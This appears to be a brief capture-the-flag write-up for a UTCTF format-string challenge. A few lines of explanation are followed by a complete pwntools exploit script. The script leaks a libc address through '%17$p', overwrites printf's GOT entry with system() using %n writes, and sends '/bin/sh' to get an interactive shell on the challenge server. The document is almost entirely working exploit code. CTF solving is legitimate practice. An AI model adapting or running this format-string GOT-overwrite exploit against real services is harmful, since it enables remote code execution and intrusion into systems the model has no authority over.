Format string x64. 17th value on stack is _libc_start_main+235. 
Write to stack address of printf@got.plt then write system address, input '/bin/sh' to stdin.


```python
from pwn import *

#p = process('./pwnable')
p = remote('binary.utctf.live', 9003)

printf_got = 0x601020
libc_start_offset = 0x20740
system_offset = 0x45390

p.recv()
p.sendline('%17$p')
libc_start235 = int(p.recvuntil(' '), 16)
p.recv()

libc = libc_start235 - 235 - libc_start_offset
system = libc + system_offset
system_byte1 = system & 0xff
system_byte23 = (system >> 8) & 0xffff

ex = '%6295584c%25$ln%1c%19$ln'
p.sendline(ex)
p.recv()

ex = '%' + str(system_byte1) + 'c%44$hhn%' + str(system_byte23 - system_byte1) + 'c%45$hn'
p.sendline(ex)
p.recv()

p.sendline('/bin/sh')


p.interactive()
```
